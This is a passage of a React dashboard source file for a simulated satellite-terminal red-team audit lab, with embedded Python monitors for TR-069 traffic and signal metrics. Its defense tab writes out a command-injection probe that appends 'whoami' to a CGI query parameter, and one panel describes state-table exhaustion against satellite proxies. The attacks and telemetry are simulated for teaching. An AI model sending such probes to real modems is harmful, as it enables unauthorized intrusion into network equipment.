      description: 'Sniffs and decodes incoming TR-069 CWMP management traffic to spot unauthorized ACS URL changes or rogue parameters.',
      language: 'python',
      code: `#!/usr/bin/env python3
import socket

def monitor_tr069_requests(port=7547):
    """
    Sets up a simple socket handler on the standard TR-069 port to monitor 
    incoming XML SOAP CWMP requests from satellite terminal modems.
    """
    print(f"[*] Initializing TR-069 SOAP Listener on port {port}...")
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        server.bind(('0.0.0.0', port))
        server.listen(5)
        while True:
            conn, addr = server.accept()
            print(f"[+] Incoming CWMP Connection from satellite node {addr[0]}")
            request = conn.recv(4096).decode('utf-8', errors='ignore')
            
            if "SetParameterValues" in request:
                print("    [ALERT] ACS SetParameterValues instruction detected.")
                if "ManagementServer.URL" in request:
                    print("    [CRITICAL] System attempting to rewrite ACS URL!")
                    
            # Return basic 204 No Content response to maintain protocol state
            conn.sendall(b"HTTP/1.1 204 No Content\\r\\nServer: CWMP-Monitor\\r\\n\\r\\n")
            conn.close()
    except KeyboardInterrupt:
        print("\\n[-] Shutting down monitor.")
    finally:
        server.close()`
    },
    {
      id: 'code9',
      title: 'Signal Baseline Anomaly Monitor',
      category: 'INFRASTRUCTURE',
      description: 'Establishes a continuous software listener to process background IQ energy, triggering alerts when the signal-to-noise ratio dips below thresholds.',
      language: 'python',
      code: `#!/usr/bin/env python3
import time
import random

def monitor_signal_baseline():
    """
    Continuous signal diagnostics monitoring. Used to establish regular 
    frequency standards and flag immediate atmospheric or jamming anomalies.
    """
    print("[*] Starting Signal Baseline Monitor...")
    print("[*] Normal baseline thresholds: SNR > 10.0dB, BER < 1e-6")
    try:
        while True:
            # Simulate real telemetry metrics
            snr = round(random.uniform(9.5, 14.5), 2)
            ber = random.uniform(1e-8, 5e-6)
            status = "NORMAL"
            
            if snr < 10.0 or ber > 1e-6:
                status = "ANOMALY_DETECTED"
                print(f"[!] [{status}] Metric degradation: SNR={snr}dB | BER={ber:.2e}")
            else:
                print(f"[+] [HEALTHY] SNR={snr}dB | BER={ber:.2e}")
            time.sleep(2)
    except KeyboardInterrupt:
        print("\\n[*] Stopped.")

if __name__ == '__main__':
    monitor_signal_baseline()`
    }
  ];

  const isDay = theme === 'DAYTIME_FIELD';

  // Dynamic tailwind styles mapping
  const c_outer_bg = isDay ? 'bg-[#D4D4D8]' : 'bg-[#090909]';
  const c_main_frame = isDay ? 'bg-[#FFFFFF] border-[#71717A] text-zinc-900' : 'bg-[#090909] border-[#1A1A1A] text-[#E0E0E0]';
  const c_header = isDay ? 'bg-[#F4F4F5] border-[#D4D4D8]' : 'bg-[#0D0D0D] border-[#2A2A2A]';
  const c_sidebar = isDay ? 'bg-[#F4F4F5] border-[#D4D4D8]' : 'bg-[#0B0B0B] border-[#2A2A2A]';
  const c_mobile_nav = isDay ? 'bg-[#F4F4F5] border-[#D4D4D8]' : 'bg-[#0B0B0B] border-[#2A2A2A]';
  
  const c_border = isDay ? 'border-[#D4D4D8]' : 'border-[#2A2A2A]';
  const c_border_heavy = isDay ? 'border-[#71717A]' : 'border-[#1A1A1A]';
  const c_bg_panel = isDay ? 'bg-[#F4F4F5]' : 'bg-[#0D0D0D]/50';
  const c_bg_card = isDay ? 'bg-[#E4E4E7]' : 'bg-[#111]';
  const c_bg_terminal = isDay ? 'bg-[#E4E4E7]' : 'bg-[#141414]';
  
  const c_text_header = isDay ? 'text-black font-semibold' : 'text-white font-bold';
  const c_text_body = isDay ? 'text-zinc-900' : 'text-[#E0E0E0]';
  const c_text_muted = isDay ? 'text-zinc-600' : 'text-gray-400';
  
  // Accents & Highlights
  const c_text_accent = isDay ? 'text-[#C2410C]' : 'text-[#FF4E00]';
  const c_bg_accent = isDay ? 'bg-[#C2410C]' : 'bg-[#FF4E00]';
  const c_bg_accent_hover = isDay ? 'hover:bg-[#9A3412]' : 'hover:bg-[#FF4E00]/80';
  const c_border_accent = isDay ? 'border-[#C2410C]' : 'border-[#FF4E00]';
  const c_border_accent_muted = isDay ? 'border-[#C2410C]/40' : 'border-[#FF4E00]/30';
  const c_bg_accent_muted = isDay ? 'bg-[#C2410C]/10' : 'bg-[#FF4E00]/10';

  return (
    <div className={`min-h-screen ${c_outer_bg} ${isDay ? 'text-zinc-900' : 'text-[#E0E0E0]'} font-sans flex items-center justify-center p-2 sm:p-4 scanline relative`}>
      <div className={`w-full max-w-7xl min-h-[calc(100vh-2rem)] lg:h-[850px] ${c_main_frame} flex flex-col overflow-auto lg:overflow-hidden select-none shadow-2xl relative z-10`}>
        
        {/* Top Header */}
        <header className={`h-16 border-b ${c_header} flex items-center justify-between px-6 sm:px-8 shrink-0`}>
          <div className="flex items-center gap-4">
            <div className={`w-3 h-3 rounded-full transition-all duration-500 ${
              jammingProbability === 'LOW' ? (isDay ? 'bg-[#C2410C] animate-pulse' : 'bg-[#FF4E00] animate-pulse') : 'bg-red-500 animate-ping'
            }`}></div>
            <span className={`text-xs font-bold tracking-[0.3em] uppercase ${c_text_muted}`}>
              Terminal Identity // <span className={`${c_text_accent} font-mono`}>GHOST-WATCH C2</span>
            </span>
          </div>
          <div className="flex items-center gap-4 sm:gap-6 text-[10px] tracking-widest uppercase font-mono text-gray-500">
            {/* Theme Toggle Button */}
            <button
              onClick={() => setTheme(theme === 'GHOST_WATCH' ? 'DAYTIME_FIELD' : 'GHOST_WATCH')}
              className={`px-2.5 py-1.5 border ${c_border} ${isDay ? 'bg-white text-zinc-900 hover:border-[#C2410C] hover:text-[#C2410C]' : 'bg-black text-white hover:border-[#FF4E00] hover:text-[#FF4E00]'} font-mono text-[9px] font-bold tracking-wider transition-all duration-150 flex items-center gap-1.5 uppercase`}
              title="Toggle Theme Mode"
            >
              {theme === 'GHOST_WATCH' ? 'GHOST-WATCH (DARK)' : 'DAYTIME OPERATION (LIGHT)'}
            </button>
            <span className={`${c_text_accent} font-bold hidden lg:inline`}>HB-9982-AX-2026</span>
            <span className={`hidden md:inline ${isDay ? 'text-zinc-500' : ''}`}>Uptime: {uptime}</span>
            <span className={`hidden sm:inline ${isDay ? 'text-zinc-500' : ''}`}>PQC-Hardened: <span className={c_text_accent}>YES</span></span>
          </div>
        </header>

        {/* Mobile Navigation Tabs */}
        <div className={`md:hidden border-b ${c_mobile_nav} p-2 overflow-x-auto scrollbar-none flex gap-1.5 shrink-0`}>
          {[
            { id: 'INFRASTRUCTURE', label: '01_INFRA' },
            { id: 'CRYPTO_ENGINE', label: '02_CRYPTO' },
            { id: 'ACTIVE_DEFENSE', label: '03_DEFENSE' },
            { id: 'SATCOM_HUB', label: '04_HUB' },
            { id: 'CODE_VAULT', label: '05_VAULT' },
            { id: 'COGNITIVE_SHIELD', label: '06_SHIELD' },
            { id: 'COGNITIVE_SCRIPT_GEN', label: '07_AI_GEN' },
          ].map((tab) => (
            <button
              key={tab.id}
              onClick={() => setActiveTab(tab.id as ActiveTab)}
              className={`px-3 py-1.5 text-[9px] font-mono font-bold tracking-wider uppercase border transition-all shrink-0 ${
                activeTab === tab.id
                  ? `${c_border_accent} ${c_text_accent} ${c_bg_accent_muted}`
                  : `${c_border} ${c_text_muted} hover:text-black dark:hover:text-white`
              }`}
            >
              {tab.label}
            </button>
          ))}
        </div>

        {/* Main Workspace Frame */}
        <div className="flex flex-col md:flex-row flex-1 overflow-auto md:overflow-hidden">
          
          {/* Sidebar Navigation */}
          <nav className={`hidden md:flex w-64 border-r ${c_sidebar} p-6 sm:p-8 flex-col justify-between shrink-0`}>
            <div className="space-y-10">
              <div>
                <h1 className={`text-4xl font-black italic leading-none tracking-tighter mb-1 ${c_text_header}`}>
                  APEX<br/>TIER
                </h1>
                <p className={`text-[10px] font-mono ${c_text_accent} uppercase tracking-widest font-bold`}>System v6.0.4</p>
              </div>
              
              <ul className="space-y-3 text-xs font-bold tracking-[0.18em] uppercase">
                {[
                  { id: 'INFRASTRUCTURE', label: '01_INFRASTRUCTURE' },
                  { id: 'CRYPTO_ENGINE', label: '02_CRYPTO_ENGINE' },
                  { id: 'ACTIVE_DEFENSE', label: '03_ACTIVE_DEFENSE' },
                  { id: 'SATCOM_HUB', label: '04_SATCOM_HUB' },
                  { id: 'CODE_VAULT', label: '05_CODE_VAULT' },
                  { id: 'COGNITIVE_SHIELD', label: '06_COGNITIVE_SHIELD' },
                  { id: 'COGNITIVE_SCRIPT_GEN', label: '07_COGNITIVE_SCRIPT_GEN' },
                ].map(item => (
                  <li 
                    key={item.id}
                    onClick={() => setActiveTab(item.id as ActiveTab)}
                    className={`flex items-center gap-3 cursor-pointer transition-all duration-150 py-1 ${
                      activeTab === item.id ? c_text_accent : `${c_text_muted} hover:text-black dark:hover:text-white`
                    }`}
                  >
                    <span className={`w-1 h-4 transition-all ${activeTab === item.id ? c_bg_accent : 'bg-transparent'}`}></span> 
                    {item.label}
                  </li>
                ))}
              </ul>
            </div>

            {/* Sidebar Footer Info */}
            <div className="space-y-4">
              <div className={`h-[1px] ${c_border} w-full`}></div>
              <div className="text-[9px] font-mono leading-relaxed text-gray-500">
                <span className={`${c_text_accent} font-bold`}>[ACTIVE]</span> OMEGA_CONTINGENCY<br/>
                ANCHOR_ID: PHYSICAL_YUBIKEY_01
              </div>
              <button 
                onClick={resetSimulators}
                className={`w-full py-2 border ${c_border} ${isDay ? 'text-zinc-700 bg-white hover:text-black hover:border-[#C2410C]' : 'text-gray-400 hover:text-white hover:border-[#FF4E00] bg-black'} font-mono text-[9px] tracking-wider transition-all duration-150 flex items-center justify-center gap-2 uppercase`}
              >
                <RefreshCw className="w-3 h-3 animate-spin-slow" /> Reset Telemetry
              </button>
            </div>
          </nav>

          {/* Main Interactive Work Area */}
          <main className={`flex-1 flex flex-col p-6 sm:p-8 overflow-y-auto ${isDay ? 'bg-white' : 'bg-[radial-gradient(circle_at_top_right,_#141414_0%,_#090909_100%)]'}`}>
            
            {/* Main Header inside Main Workspace */}
            <div className="flex flex-col sm:flex-row justify-between items-start sm:items-end gap-4 mb-8">
              <div>
                <span className={`text-[10px] tracking-[0.4em] uppercase font-bold ${c_text_accent} mb-1 block`}>
                  Interactive Lab // Mode {activeTab}
                </span>
                <h2 className={`text-3xl sm:text-4xl font-light tracking-tight leading-none ${c_text_header} italic font-display`}>
                  SATCOM Intelligence <br/>& Red-Team Audit
                </h2>
              </div>
              
              <div className={`${c_bg_terminal} border ${c_border} px-4 py-3 rounded flex items-center gap-4 shrink-0`}>
                <div className="text-left font-mono">
                  <div className={`text-2xl font-bold transition-all ${
                    snr > 10 ? c_text_accent : 'text-red-500'
                  }`}>
                    {snr.toFixed(2)}<span className="text-xs opacity-50 ml-1">dB</span>
                  </div>
                  <div className={`text-[8px] tracking-widest ${c_text_muted} uppercase font-bold`}>Signal SNR</div>
                </div>
                <div className={`h-8 w-[1px] ${c_border}`}></div>
                <div className="text-left font-mono">
                  <div className={`text-xs ${c_text_header} uppercase font-bold tracking-wider`}>
                    {ber.toExponential(2)}
                  </div>
                  <div className={`text-[8px] tracking-widest ${c_text_muted} uppercase font-bold`}>Bit Error (BER)</div>
                </div>
              </div>
            </div>

            {/* Simulated Live Alarm Alert Box */}
            {snr < 5 && (
              <div className={`mb-6 p-3 border-l-4 border-red-500 ${isDay ? 'bg-red-50 text-red-800' : 'bg-red-950/20 text-red-400'} flex items-center justify-between text-xs font-mono`}>
                <div className="flex items-center gap-2">
                  <AlertTriangle className="w-4 h-4 text-red-500 animate-pulse" />
                  <span>[CRITICAL] Link Quality Alert: Severe signal degradation detected.</span>
                </div>
                <button 
                  onClick={() => { setSnr(12.82); setBer(1.24e-8); setIsAcuAligned(true); }}
                  className="px-2 py-0.5 bg-red-500 text-black font-bold uppercase text-[9px]"
                >
                  Auto-Align Dish
                </button>
              </div>
            )}

            {/* TAB CONTENT IMPLEMENTATIONS */}
            
            {/* Tab 1: INFRASTRUCTURE */}
            {activeTab === 'INFRASTRUCTURE' && (
              <div className="space-y-6 flex-1">
                
                {/* Simulated Live Antenna Dials */}
                <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
                  
                  <div className="border border-[#2A2A2A] bg-[#0D0D0D]/50 p-5 flex flex-col justify-between">
                    <div>
                      <div className="flex justify-between items-center mb-3">
                        <span className="text-[9px] font-mono text-[#FF4E00] tracking-widest uppercase font-bold">MOD-01_ANTENNA_ACU</span>
                        <span className={`px-2 py-0.5 text-[8px] font-mono font-bold ${
                          isAcuAligned ? 'bg-green-950/40 border border-green-800 text-green-400' : 'bg-red-950/40 border border-red-800 text-red-400'
                        }`}>
                          {isAcuAligned ? 'ALIGNED_TO_SAT' : 'OFF_POINT_WARNING'}
                        </span>
                      </div>
                      <h3 className="text-lg font-bold tracking-wider text-white mb-4">Dish Orientation</h3>
                      
                      {/* Compass Dial Indicator */}
                      <div className="flex justify-center my-4">
                        <div className="relative w-28 h-28 border border-[#2a2a2a] rounded-full flex items-center justify-center bg-black/50">
                          <Compass className="w-16 h-16 text-gray-600" />
                          <div 
                            className="absolute w-1 h-12 bg-[#FF4E00] origin-bottom -translate-y-6 transition-all duration-700"
                            style={{ transform: `rotate(${acuAzimuth}deg)` }}
                          ></div>
                          <div className="absolute top-1 text-[8px] font-mono text-gray-500">N</div>
                        </div>
                      </div>

                      <div className="grid grid-cols-2 gap-2 text-center font-mono text-xs mt-3">
                        <div className="bg-[#141414] p-2 border border-[#2A2A2A]">
                          <span className="block text-[8px] text-gray-500">AZIMUTH</span>
                          <span className="text-sm text-white font-bold">{acuAzimuth.toFixed(1)}°</span>
                        </div>
                        <div className="bg-[#141414] p-2 border border-[#2A2A2A]">
                          <span className="block text-[8px] text-gray-500">ELEVATION</span>
                          <span className="text-sm text-white font-bold">{acuElevation.toFixed(1)}°</span>
                        </div>
                      </div>
                    </div>

                    <div className="mt-4 pt-4 border-t border-[#1E1E1E]">
                      <button 
                        onClick={() => runSimulatedAttack('ACU_DEPOINT')}
                        disabled={isSimulatingAttack !== null}
                        className="w-full py-2 bg-[#FF4E00] text-black hover:bg-[#FF4E00]/80 font-mono text-xs font-black uppercase tracking-wider flex items-center justify-center gap-2"
                      >
                        <Play className="w-3.5 h-3.5 fill-current" /> De-Point Antenna (Attack Sim)
                      </button>
                    </div>
                  </div>

                  <div className="border border-[#2A2A2A] bg-[#0D0D0D]/50 p-5 flex flex-col justify-between md:col-span-2">
                    <div>
                      <div className="flex justify-between items-center mb-3">
                        <span className="text-[9px] font-mono text-[#FF4E00] tracking-widest uppercase font-bold">MOD-02_CWMP_ACS</span>
                        <span className="px-2 py-0.5 bg-[#FF4E00]/10 border border-[#FF4E00]/30 text-[9px] text-[#FF4E00] font-mono">STANDBY_LISTENER</span>
                      </div>
                      <h3 className="text-lg font-bold tracking-wider text-white mb-2">TR-069 Configuration Audit</h3>
                      <p className="text-xs text-gray-400 mb-4 leading-relaxed">
                        CWMP is the primary remote management system for VSAT client modems. Attackers intercepting CWMP packets can hijack the terminal by setting fake Auto-Configuration Server (ACS) URLs.
                      </p>

                      <div className="space-y-3 font-mono text-xs">
                        <div className="p-3 bg-[#111111] border border-[#222222] text-gray-400">
                          <span className="text-[#FF4E00] block mb-1 font-bold">[ACTIVE MONITOR COMPONENT]</span>
                          Listen Address: <span className="text-white">0.0.0.0:7547</span><br/>
                          Signature Validation: <span className="text-green-500">HARDENED</span><br/>
                          Current Active ACS Server: <span className="text-white">https://acs.telstar-hub.local/cwmp</span>
                        </div>

                        <div className="p-3 bg-black rounded text-[11px] text-gray-500 h-24 overflow-y-auto leading-normal">
                          <div className="text-green-500">[INFRA] CWMP connection request validated from client modem (10.42.0.82)</div>
                          <div>[INFRA] Parameter request: InternetGatewayDevice.DeviceInfo.HardwareVersion</div>
                          <div>[INFRA] Response: standard 204 status returned. Server safe.</div>
                          <div className="text-[#FF4E00] font-bold">[ALERT] Monitoring TR-069 port 7547 for ACS URL rewrite signals...</div>
                        </div>
                      </div>
                    </div>

                    <div className="mt-4 pt-4 border-t border-[#1E1E1E] flex gap-2">
                      <button 
                        onClick={() => triggerDownload('tr069_hardening_guide.pdf', 'CWMP & TR-069 Secure Configuration Guide')}
                        className="flex-1 py-2 border border-[#2A2A2A] hover:border-[#FF4E00] text-white font-mono text-xs font-bold uppercase tracking-wider flex items-center justify-center gap-2"
                      >
                        <Download className="w-3.5 h-3.5" /> Hardening Guide
                      </button>
                    </div>
                  </div>

                </div>

                {/* Signal Baseline Telemetry */}
                <div className="border border-[#2A2A2A] bg-[#0B0B0B] p-6">
                  <div className="flex justify-between items-center mb-4">
                    <div>
                      <h4 className="text-sm font-mono text-[#FF4E00] tracking-widest uppercase font-bold mb-1">Signal Baseline Monitor</h4>
                      <p className="text-xs text-gray-500">Live dynamic diagnostic checks tracking satellite carrier metrics.</p>
                    </div>
                    <span className="text-[10px] text-gray-500 font-mono">THRESHOLD: SNR &gt; 10dB</span>
                  </div>
                  
                  <div className="grid grid-cols-1 md:grid-cols-4 gap-4">
                    <div className="bg-[#141414] p-3 border border-[#2a2a2a] rounded">
                      <span className="block text-[8px] text-gray-400 uppercase font-mono mb-1">Antenna Type</span>
                      <span className="text-xs text-white font-bold uppercase">1.2m Ku-Band Flyaway</span>
                    </div>
                    <div className="bg-[#141414] p-3 border border-[#2a2a2a] rounded">
                      <span className="block text-[8px] text-gray-400 uppercase font-mono mb-1">Downlink Carrier</span>
                      <span className="text-xs text-[#FF4E00] font-mono font-bold">12.450 GHz</span>
                    </div>
                    <div className="bg-[#141414] p-3 border border-[#2a2a2a] rounded">
                      <span className="block text-[8px] text-gray-400 uppercase font-mono mb-1">FEC Code Rate</span>
                      <span className="text-xs text-white font-mono font-bold">3/4 QPSK</span>
                    </div>
                    <div className="bg-[#141414] p-3 border border-[#2a2a2a] rounded">
                      <span className="block text-[8px] text-gray-400 uppercase font-mono mb-1">Status Status</span>
                      <span className={`text-xs font-mono font-bold uppercase ${
                        snr > 10 ? 'text-green-500' : 'text-red-500'
                      }`}>
                        {snr > 10 ? 'NORMAL_OPERATION' : 'SIGNAL_DEGRADATION'}
                      </span>
                    </div>
                  </div>
                </div>

              </div>
            )}

            {/* Tab 2: CRYPTO_ENGINE */}
            {activeTab === 'CRYPTO_ENGINE' && (
              <div className="space-y-6 flex-1">
                
                {/* NIST Post Quantum Hardening Status Banner */}
                <div className="border border-[#2A2A2A] bg-[#111] p-5 flex flex-col md:flex-row justify-between items-start md:items-center gap-4">
                  <div className="space-y-1">
                    <div className="flex items-center gap-2">
                      <Shield className="w-4 h-4 text-[#FF4E00]" />
                      <span className="text-xs font-mono font-bold tracking-widest text-[#FF4E00] uppercase">NIST_STANDARD_PQC_ACTIVE</span>
                    </div>
                    <h3 className="text-lg font-bold text-white tracking-wider">Post-Quantum Cryptography</h3>
                    <p className="text-xs text-gray-400 max-w-xl">
                      This terminal uses standard Kyber (key encapsulation) and Dilithium (digital signatures) to insulate our satellite command-and-control links from future decryption risk.
                    </p>
                  </div>
                  <div className="px-4 py-2 bg-[#FF4E00]/10 border border-[#FF4E00]/30 text-[#FF4E00] font-mono text-xs font-bold shrink-0">
                    STATUS: KEY_EXCHANGE_SECURED
                  </div>
                </div>

                {/* Interactive DSSS Waveform Spreading Simulator */}
                <div className="border border-[#2A2A2A] bg-[#0D0D0D]/50 p-6">
                  <div className="flex justify-between items-center mb-4">
                    <div>
                      <h3 className="text-lg font-bold tracking-wider text-white">DSSS LPI Modulator Playground</h3>
                      <p className="text-xs text-gray-400">Type ASCII text below to spread it under the noise floor using a pseudo-noise sequence.</p>
                    </div>
                    <span className="px-2 py-0.5 border border-[#FF4E00]/30 text-[#FF4E00] text-[9px] font-mono">BPSK SPREAD</span>
                  </div>

                  <div className="grid grid-cols-1 md:grid-cols-3 gap-6 items-start">
                    
                    {/* Input Controls */}
                    <div className="space-y-4">
                      <div>
                        <label className="block text-[10px] font-mono text-gray-400 uppercase tracking-wider mb-1.5">Input Word (Max 8 Char)</label>
                        <input 
                          type="text"
                          value={dsssInput}
                          onChange={(e) => setDsssInput(e.target.value.slice(0, 8).toUpperCase())}
                          placeholder="e.g. SAT"
                          className="w-full bg-black border border-[#2a2a2a] text-white p-2 text-sm font-mono focus:border-[#FF4E00] focus:outline-none"
                        />
                      </div>

                      <div>
                        <label className="block text-[10px] font-mono text-gray-400 uppercase tracking-wider mb-1.5">Spreading Factor (SF)</label>
                        <select 
                          value={chipRate}
                          onChange={(e) => setChipRate(Number(e.target.value))}
                          className="w-full bg-black border border-[#2a2a2a] text-white p-2 text-sm font-mono focus:border-[#FF4E00] focus:outline-none"
                        >
                          <option value={7}>7 Chips / Bit</option>
                          <option value={11}>11 Chips / Bit (Gold sequence approximation)</option>
                          <option value={15}>15 Chips / Bit</option>
                        </select>
                      </div>

                      <button 
                        onClick={handleSpreadData}
                        className="w-full py-2.5 bg-[#FF4E00] text-black hover:bg-[#FF4E00]/80 font-mono text-xs font-black uppercase tracking-wider flex items-center justify-center gap-2"
                      >
                        <Cpu className="w-3.5 h-3.5" /> Spread & Transmit
                      </button>
                    </div>

                    {/* Results Displays */}
                    <div className="md:col-span-2 space-y-4">
                      {spreadResult.isSpread ? (
                        <div className="space-y-3 font-mono text-xs">
                          <div className="p-3 bg-black border border-[#222]">
                            <span className="text-gray-400 block text-[9px]">RAW BINARY BITSTREAM</span>
                            <span className="text-white text-sm font-bold block overflow-x-auto whitespace-nowrap">{spreadResult.binary}</span>
                          </div>

                          <div className="p-3 bg-black border border-[#222]">
                            <span className="text-gray-400 block text-[9px]">SPREAD CHIP PATTERN (FIRST 3 BITS)</span>
                            <div className="flex gap-1 overflow-x-auto py-2 whitespace-nowrap">
                              {spreadResult.spreadChips.map((chip, idx) => (
                                <span 
                                  key={idx}
                                  className={`w-6 h-6 flex items-center justify-center text-[10px] font-bold shrink-0 ${
                                    chip === 1 ? 'bg-[#FF4E00] text-black' : 'bg-gray-800 text-gray-400'
                                  }`}
                                >
                                  {chip > 0 ? '+1' : '-1'}
                                </span>
                              ))}
                            </div>
                            <span className="text-[9px] text-[#FF4E00] italic block mt-1">Multiplied with active PN sequence, decreasing spectral power density.</span>
                          </div>

                          {/* Simplified ASCII recovery check */}
                          <div className="text-[10px] text-green-500 italic flex items-center gap-2 mt-1">
                            <Check className="w-3.5 h-3.5" />
                            <span>Simulation verified: receiver correlation recovered word "{dsssInput}" with 100% accuracy under negative SNR.</span>
                          </div>
                        </div>
                      ) : (
                        <div className="h-44 border border-dashed border-[#2a2a2a] flex flex-col items-center justify-center text-gray-500 font-mono text-xs text-center p-6 bg-black/10">
                          <Terminal className="w-8 h-8 text-[#FF4E00]/30 mb-2" />
                          <span>Input a word and click "Spread & Transmit" to observe direct sequence spread spectrum waveforms.</span>
                        </div>
                      )}
                    </div>

                  </div>
                </div>

              </div>
            )}

            {/* Tab 3: ACTIVE_DEFENSE */}
            {activeTab === 'ACTIVE_DEFENSE' && (
              <div className="space-y-6 flex-1">
                
                <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                  
                  {/* CVE-2024-6199 vulnerability check simulator */}
                  <div className="border border-[#2A2A2A] bg-[#0D0D0D]/50 p-5 flex flex-col justify-between">
                    <div>
                      <div className="flex justify-between items-center mb-3">
                        <span className="text-[9px] font-mono text-[#FF4E00] tracking-widest uppercase font-bold">CVE-2024-6199 AUDIT</span>
                        <span className="px-2 py-0.5 bg-red-950/40 border border-red-800 text-red-400 text-[8px] font-mono font-bold">CRITICAL_VULN</span>
                      </div>
                      <h3 className="text-lg font-bold text-white mb-2">Web UI Auth Bypass Scanner</h3>
                      <p className="text-xs text-gray-400 leading-relaxed mb-4">
                        Legacy modems often fail to validate commands passed through status query scripts. This scans target ports for the auth bypass payload and tests command sanitization.
                      </p>

                      <div className="space-y-2 font-mono text-xs">
                        <div className="bg-black p-3 border border-[#222] text-gray-400">
                          <span className="text-[9px] block text-[#FF4E00] font-bold">PROBING PAYLOAD</span>
                          GET /cgi-bin/admin_status.cgi?cmd=echo;%20whoami
                        </div>

                        <div className="bg-black p-3 text-[10px] text-gray-500 h-20 overflow-y-auto rounded">
                          <div>[AUDIT] Starting local subnet sweep on target modem address (192.168.100.1)...</div>
                          {isSimulatingAttack === 'CVE_SCAN' ? (
                            <div className="text-red-500 font-bold">[VULNERABLE] auth bypass detected! Command returned username: root</div>
                          ) : (
                            <div className="text-green-500">[SAFE] Terminal management interface requires correct admin credentials.</div>
                          )}
                        </div>
                      </div>
                    </div>

                    <div className="mt-4 pt-4 border-t border-[#1E1E1E]">
                      <button 
                        onClick={() => runSimulatedAttack('CVE_SCAN')}
                        disabled={isSimulatingAttack !== null}
                        className="w-full py-2 bg-black border border-[#2A2A2A] hover:border-[#FF4E00] text-white font-mono text-xs font-bold uppercase tracking-wider flex items-center justify-center gap-2"
                      >
                        <Play className="w-3.5 h-3.5 fill-current" /> Scan Local Gateway Subnet
                      </button>
                    </div>
                  </div>

                  {/* PEP State Limit Exhaustion Simulator */}
                  <div className="border border-[#2A2A2A] bg-[#0D0D0D]/50 p-5 flex flex-col justify-between">
                    <div>
                      <div className="flex justify-between items-center mb-3">
                        <span className="text-[9px] font-mono text-[#FF4E00] tracking-widest uppercase font-bold">PEP_ACCELERATOR_TEST</span>
                        <span className={`px-2 py-0.5 text-[8px] font-mono font-bold ${
                          pepStatus === 'NOMINAL' ? 'bg-green-950/40 border border-green-800 text-green-400' : 'bg-red-950/40 border border-red-800 text-red-400'
                        }`}>
                          {pepStatus}
                        </span>
                      </div>
                      <h3 className="text-lg font-bold text-white mb-2">Performance Enhancing Proxy Audit</h3>
                      <p className="text-xs text-gray-400 leading-relaxed mb-4">
                        Due to satellite delay, modems proxy TCP connections locally. An attacker sending malformed TCP options or high connection spikes can exhaust the state table, forcing the hub back to raw slow transmission.
                      </p>

                      <div className="grid grid-cols-2 gap-2 text-center font-mono text-xs mb-3">
                        <div className="bg-[#141414] p-2 border border-[#2A2A2A]">
                          <span className="block text-[8px] text-gray-500">ACTIVE STATE CONNECTIONS</span>
                          <span className="text-sm text-white font-bold">{pepStateConnections} / 512</span>
                        </div>
                        <div className="bg-[#141414] p-2 border border-[#2A2A2A]">
                          <span className="block text-[8px] text-gray-500">PROXY FLOW TIMEOUTS</span>
                          <span className="text-sm text-[#FF4E00] font-bold">
                            {pepStatus === 'EXHAUSTED' ? '82 TIMES/SEC' : '0'}
                          </span>
                        </div>
                      </div>
                    </div>

                    <div className="mt-4 pt-4 border-t border-[#1E1E1E]">
                      <button 
                        onClick={() => runSimulatedAttack('PEP_EXHAUSTION')}
                        disabled={isSimulatingAttack !== null}
                        className="w-full py-2 bg-[#FF4E00] text-black hover:bg-[#FF4E00]/80 font-mono text-xs font-black uppercase tracking-wider flex items-center justify-center gap-2"
                      >
                        <Play className="w-3.5 h-3.5 fill-current" /> Trigger State Exhaustion Burst
                      </button>
                    </div>
                  </div>

                </div>

                {/* Additional Active Safeguards Description */}
                <div className="border border-[#2A2A2A] bg-[#0B0B0B] p-5">
                  <h4 className="text-xs font-mono text-[#FF4E00] tracking-widest uppercase font-bold mb-3">Active Defense Matrix Checks</h4>
                  <div className="grid grid-cols-1 md:grid-cols-3 gap-4 text-xs">
                    <div className="p-3 bg-[#111] border border-[#222]">
                      <span className="text-white font-bold block mb-1">Tarpitting Protection</span>
                      <p className="text-gray-400 leading-relaxed">Artificially slows response rates for unrecognized sweeps, preventing attackers from identifying system ports.</p>
                    </div>
                    <div className="p-3 bg-[#111] border border-[#222]">
                      <span className="text-white font-bold block mb-1">Canary Tokens Deployment</span>
                      <p className="text-gray-400 leading-relaxed">Rogue configuration templates loaded onto false management paths to instantly alert of unauthorized scans.</p>
                    </div>
                    <div className="p-3 bg-[#111] border border-[#222]">
                      <span className="text-white font-bold block mb-1">Input Sanitization Guard</span>
                      <p className="text-gray-400 leading-relaxed">Protects command routing API handlers from injection attacks by filtering special characters before processing commands.</p>
                    </div>
                  </div>
                </div>

              </div>
            )}

            {/* Tab 4: SATCOM_HUB */}
            {activeTab === 'SATCOM_HUB' && (
              <div className="space-y-6 flex-1">
                
                <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
                  
                  {/* SDR Live Waveform Plotting */}
                  <div className={`border ${c_border} ${c_bg_panel} p-5 md:col-span-2 flex flex-col justify-between`}>
                    <div>
                      <div className="flex justify-between items-center mb-4">
                        <span className={`text-[9px] font-mono ${c_text_accent} tracking-widest uppercase font-bold`}>PLUTOSDR_LIVE_SPECTRUM_SIM</span>
                        <div className="flex items-center gap-2">
                          <span className="w-2 h-2 bg-green-500 rounded-full animate-ping"></span>
                          <span className="text-[8px] font-mono font-bold text-green-400">RECEIVING_SDR_SAMPLES</span>
                        </div>
                      </div>

                      <div className="flex justify-between items-center mb-4">
                        <h3 className={`text-lg font-bold ${c_text_header} tracking-wider`}>Live RF Spectrum Analyzer</h3>
                        <div className="text-right font-mono text-xs">
                          <span className={c_text_muted}>Center: </span><span className={`${c_text_accent} font-bold`}>{plutoCenterFreq.toFixed(3)} GHz</span>
                        </div>
                      </div>

                      {/* Spectrum Graph container (using custom CSS bars) */}
                      <div className={`h-40 border ${c_border} bg-black p-2 rounded flex items-end gap-[2px] relative overflow-hidden`}>
                        
                        {/* Simulated Grid Lines */}
                        <div className="absolute inset-0 flex flex-col justify-between pointer-events-none opacity-20 p-2 text-[8px] font-mono text-gray-500">
                          <div>-50 dBFS</div>
                          <div>-70 dBFS</div>
                          <div>-90 dBFS</div>
                        </div>

                        {spectrumData.map((val, idx) => {
                          const heightPct = Math.max(5, Math.min(95, ((val + 110) / 70) * 100));
                          const barGradient = isDay 
                            ? 'bg-gradient-to-t from-zinc-900 to-[#C2410C]' 
